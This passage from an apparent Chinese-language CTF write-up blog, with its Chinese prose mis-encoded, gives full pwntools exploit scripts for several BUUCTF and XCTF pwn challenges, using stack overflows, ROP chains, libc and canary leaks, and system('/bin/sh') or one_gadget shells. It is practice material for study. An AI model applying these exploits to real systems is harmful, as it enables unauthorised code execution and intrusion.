p64(ret) + p64(name_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>æˆ‘è¿œç¨‹æ²¡æ‰“é€šï¼ŒæŒ‰ç†åº”è¯¥æ˜¯å¯ä»¥çš„ã€‚å¯èƒ½æ˜¯é¢˜çš„é—®é¢˜ï¼Œæ³¨æ„è¦æŠŠ<code>context.arch</code>æ”¹ä¸ºå’Œç¨‹åºä¸€æ ·çš„ã€‚çœ‹ä¸‹ç¨‹åº<code>checksec &lt;file_name&gt;</code>æ¶æ„æ˜¯<code>amd64-64-little</code>çš„ã€‚</p><h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p><del>32ä½ç¨‹åºï¼Œé™æ€é“¾æ¥ã€‚å…ˆç”¨<code>checksec</code>æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ä¿æŠ¤æƒ…å†µï¼Œåªå¼€å¯äº†<code>NX</code>ï¼Œæ— æ³•ç”¨<code>shellcode</code>ï¼Œä½†æ˜¯<code>ROP</code>æ˜¯å¯ä»¥çš„ï¼Œå¹¶ä¸”<code>IDA</code>åç¼–è¯‘ä¹‹åæœ‰<code>gets</code>ï¼Œè€Œä¸”æ˜¯é™æ€é“¾æ¥ï¼Œç”šè‡³ä¸ç”¨<code>libc</code>ï¼Œä¸€çœ¼ç®€å•é¢˜ï¼Œå¼€å§‹å°è¯•ã€‚</del></p><p><del>æ²¡æœ‰<code>system</code>ï¼Œæ²¡æœ‰<code>/bin/sh</code>ï¼Œå¥½åƒä¸å¥½æshellï¼Œä½†æ˜¯å‘ç°å­—ç¬¦ä¸²é‡Œé¢æœ‰<code>flag.txt</code>ï¼Œè°ƒç”¨ä¸ªé“¾<code>open -&gt; read -&gt; write</code>?ç¨‹åºé‡Œæ­£å¥½æœ‰è¿™ä¸‰ä¸ªå‡½æ•°ï¼Œç›®å‰æ€è·¯æ˜¯è¿™æ ·ï¼Œå°è¯•ä¸‹ã€‚</del></p><p>å¤ªç²—å¿ƒäº†ï¼Œæ²¡çœ‹åˆ°æœ‰åé—¨å‡½æ•°ï¼Œé‚£å°±ä¸ç”¨æ„é€ <code>orw</code>äº†ï¼Œä½†æŒ‰ç†ä¹Ÿè¡Œåº”è¯¥ï¼ˆï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>Local = <span class="hljs-literal">True</span><br><span class="hljs-comment"># Local = False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:29895&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p.recvline()</span><br>get_secret = <span class="hljs-number">0x080489A0</span><br>write = <span class="hljs-number">0x0806e270</span><br>bss_addr = <span class="hljs-number">0x080ECA2D</span><br>gdb.attach(p)<br><span class="hljs-comment">#-----open(&#x27;flag.txt&#x27;)-----#</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x2d</span> + p32(get_secret) + p32(write) + p32(bss_addr) + p32(<span class="hljs-number">1</span>) + p32(bss_addr) + p32(<span class="hljs-number">0x50</span>)<br><br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h1><p>64ä½ï¼ŒåŠ¨æ€é“¾æ¥ç¨‹åº<br>ä¿æŠ¤æƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">spongebob@spongebob:~/Document/pwn$ checksec pwn<br>[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>å¼€å¯äº†æ ˆæ‰§è¡Œä¿æŠ¤ï¼Œå…ˆä¸è€ƒè™‘bss</p><p>åŠ¨æ€é“¾æ¥è°ƒ<code>system(&#39;/bin/sh&#39;)</code>è¯•è¯•å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27536&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvline(<span class="hljs-string">b&quot;Input your choice!&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gets_got = elf.got[<span class="hljs-string">&#x27;gets&#x27;</span>]<br>encrypt = <span class="hljs-number">0x4009A0</span><br>pop_rdi_ret = <span class="hljs-number">0x400c83</span><br><br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Input your Plaintext to be encrypted&quot;</span>)<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x57</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(gets_got) + p64(puts_plt) + p64(encrypt)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;Ciphertext\n&quot;</span>)<br>p.recvline()<br>puts_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gets_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;puts_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;gets_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(gets_addr)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#--------step-2---------#</span><br><br>libc_addr = puts_addr - <span class="hljs-number">0x809c0</span><br>system = libc_addr + <span class="hljs-number">0x4f440</span><br>bin_sh = libc_addr + <span class="hljs-number">0x1b3e9a</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x57</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)<br>p.recvuntil(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåšçš„æ—¶å€™ä¸€ç›´åœ¨å–åœ°å€çš„æ—¶å€™å‡ºç°é—®é¢˜ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&quot;Ciphertext\n&quot;</span>)<br>p.recvline()                 <span class="hljs-comment"># åŠ äº†è¿™ä¸€å¥æ‰è§£å†³</span><br>puts_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gets_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;puts_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;gets_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(gets_addr)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>åŸå› æ˜¯ï¼Œè¦†ç›–è¿”å›åœ°å€è¦†ç›–çš„æ˜¯<code>puts(s)</code>çš„è¿”å›åœ°å€ï¼Œ<code>puts(s)</code>æœ¬èº«æ˜¯ä¼šæœ‰ä¸œè¥¿è¾“å‡ºäº†ï¼Œæ‰€ä»¥è¦å¤šæ”¶ä¸€è¡Œã€‚</p><h1 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h1><p>32ä½ç½®ï¼ŒåŠ¨æ€é“¾æ¥<br>ä¿æŠ¤æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>æ— æ³•ç”¨<code>bss</code>ç›´æ¥å†™äº†ï¼Œæˆ‘åœ¨è¿™ä¸ªé¢˜æ²¡æ‰¾åˆ°æ ˆæº¢å‡ºçš„åœ°æ–¹ï¼ˆï¼ˆï¼ˆ<br>ä¸è¿‡æœ‰<code>system</code>å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:28162&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>system = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh = <span class="hljs-number">0x080482ea</span><br>passwd = <span class="hljs-string">b&quot;administrator&quot;</span><br>p.recvuntil(<span class="hljs-string">b&quot;password:&quot;</span>)<br>p.sendline(passwd)<br>p.recvuntil(<span class="hljs-string">b&quot;0.Exit&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Please input new log info:&quot;</span>)<br>payload = <span class="hljs-number">0x4c</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(sh)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>å…·ä½“åˆ©ç”¨åŸç†åœ¨äºï¼š<br><img src="/images/20250818120003.png"><br>è¿™é‡Œsrcåªæœ‰48å­—èŠ‚å¤§å°ï¼Œä½†æ˜¯åœ¨<code>AddLog</code>é‡Œé¢å¯ä»¥è¾“å…¥128å­—èŠ‚ï¼Œå¯ä»¥æ„é€ æ ˆæº¢å‡ºï¼Œç„¶ååœ¨<code>GetFlag</code>é‡Œé¢åˆ©ç”¨ã€‚å› ä¸º<code>GetFlag</code>é‡Œé¢ä¼šè¿”å›å¯æ§çš„åœ°å€ã€‚</p><h1 id="é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop"><a href="#é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop" class="headerlink" title="é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop"></a>é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</h1><p>ç®€å•çš„ROPï¼Œæ³„éœ²<code>libc</code>å°±å¯ä»¥äº†ã€‚</p><h1 id="pwn1-xctf"><a href="#pwn1-xctf" class="headerlink" title="pwn1(xctf)"></a>pwn1(xctf)</h1><p>64ä½åŠ¨æ€é“¾æ¥ï¼Œæœ‰Canaryä¿æŠ¤ï¼ˆç¬¬ä¸€æ¬¡æ¥è§¦Canaryä¿æŠ¤çš„é¢˜ç›®ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br></code></pre></td></tr></table></figure><p>å…ˆæ¢ä¸€ä¸‹åŠ¨æ€é“¾æ¥å™¨å’Œå…±äº«åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --replace-needed libc.so.6 /home/spongebob/Document/pwn/libc-2.23.so pwn<br><br>patchelf --set-interpreter /home/spongebob/Document/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so pwn<br></code></pre></td></tr></table></figure><p><code>puts</code>é‡åˆ°å›è½¦ä¸ä¼šåœï¼Œé‡åˆ°<code>\x00</code>æ‰ä¼šåœï¼Œå› æ­¤å¯ä»¥è¦†ç›–æ‰<code>canary</code>çš„æœ€ä½ä½ï¼Œç„¶åæ‰“å°å‡ºæ•´ä¸ª<code>canary</code>å¹¶ä¸”è¡¥å…¨å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br><span class="hljs-comment"># context.log_level=&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;61.147.171.105:60635&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br>    <br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x400a93</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x400908</span><br><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment">#-------æ³„æ¼canary-------#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><span class="hljs-comment"># canary = u64(p.recv(7).strip().rjust(8, b&#x27;x\x00&#x27;))</span><br>canary = p.recv(<span class="hljs-number">7</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + canary<br>canary = u64(canary)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;canary: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br><span class="hljs-comment">#-------æ³„æ¼libc--------#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendline(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;puts_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>libc_addr = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc_addr + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_addr + <span class="hljs-number">0x18c177</span><br>one_gadget = libc_addr + <span class="hljs-number">0x45216</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;system_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(system)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;binsh_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#--------æ³„éœ²æ–°çš„canary--------#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><span class="hljs-comment"># canary = u64(p.recv(7).strip().rjust(8, b&#x27;x\x00&#x27;))</span><br>canary = p.recv(<span class="hljs-number">7</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + canary<br>canary = u64(canary)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;canary: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#--------ROPè·å¾—shell--------#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x8</span> + p64(one_gadget)<br>p.sendline(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>æˆ‘çš„<code>exp</code>é‡Œæ³„éœ²äº†ä¸¤æ¬¡<code>canary</code>ï¼Œæˆ‘ä»¥ä¸ºé‡æ–°è¿”å›<code>main</code>åcanaryä¼šæ›´æ–°ã€‚è¿™ä¸ªæ˜¯æˆ‘ä»<code>canary</code>çš„åŸç†æ˜¯è‡ªå·±ç†è§£çš„ã€‚ä½†å®é™…ä¸Šä»æ±‡ç¼–è°ƒç”¨å¯ä»¥çŸ¥é“ï¼Œè¿”å›<code>main</code>åä»ç„¶å°†<code>var_8</code>å’Œ<code>fs+0x28</code>è¿›è¡Œæ¯”è¾ƒï¼Œ<code>var_8</code>åœ¨è¿™ä¸ªè¿‡ç¨‹å¹¶æ²¡æœ‰å‘ç”Ÿæ”¹å˜ã€‚</p><h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h1><p>64ä½åŠ¨æ€é“¾æ¥ç¨‹åºï¼Œå…ˆç”¨IDAçœ‹ï¼Œå‘ç°æœ‰æ•´æ•°æº¢å‡ºçš„é—®é¢˜ï¼Œç„¶ååº”è¯¥å°±æ˜¯ç®€å•ROPäº†</p><p><img src="/images/20250819164230.png"></p><p>æ•´æ•°æº¢å‡ºç”¨-1æ¥ç»•è¿‡ï¼Œå› ä¸ºåé¢è½¬æˆäº†<code>unsigned int</code>ï¼Œæ‰€ä»¥å¯ä»¥<code>read</code>å¾ˆå¤šå­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26320&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span 